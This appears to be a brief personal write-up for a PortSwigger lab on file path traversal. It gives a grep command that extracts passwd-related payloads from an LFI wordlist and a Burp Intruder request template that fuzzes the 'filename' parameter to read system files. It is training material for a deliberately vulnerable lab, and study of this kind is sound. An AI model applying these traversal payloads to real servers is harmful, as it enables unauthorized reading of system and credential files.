https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

```bash
grep passwd /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt >  /tmp/asd.txt
```

Load into Burp's Intruder:

```http
GET /image?filename={HERE} HTTP/2
Host: 0acb007803bab8d1806c76f100d30069.web-security-academy.net
Cookie: session=RirU5TGBf8501LQy2cO9guFVsNuqb1qO
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0acb007803bab8d1806c76f100d30069.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: i
```

![](_attachment/Pasted%20image%2020250404143738.png)

